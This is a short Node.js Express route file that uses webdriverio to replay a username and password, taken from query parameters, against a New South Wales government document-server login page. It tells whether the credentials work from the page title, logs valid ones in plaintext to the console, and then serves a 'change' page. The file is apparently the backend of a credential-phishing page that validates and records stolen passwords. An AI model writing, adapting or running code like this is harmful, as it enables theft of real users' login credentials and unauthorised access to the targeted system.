var express = require('express');
var router = express.Router();
var path = require('path');
var webdriverio = require('webdriverio');
var options = {
    desiredCapabilities: {
        browserName: 'chrome'
    }
};
var client = webdriverio.remote(options);


/* GET home page. */
router.get('/', function (req, res, next) {
    var username = req.query.j_username;
    var oldPass = req.query.j_password;

    client
        .init().url('https://ssrocdocuments.nsw.gov.au/users/login/')
        .setValue('[name="j_username"]', username)
        .setValue('[name="j_password"]', oldPass)
        .click('#loginSubmitButton')
        .getTitle().then(function (title) {
            if (title == "AsdeqDocs Server - Log In") {
                console.log("Incorrect Password");
                res.sendFile(path.join(__dirname + '/pages/incorrect.html'));
            } else {
                console.log("Correct Password")
                var stringDisplay = "Username: " + username + " Password: " + oldPass;
                console.log(stringDisplay);
                res.sendFile(path.join(__dirname + '/pages/change.html'));
            }
        })
        .end();
});

module.exports = router;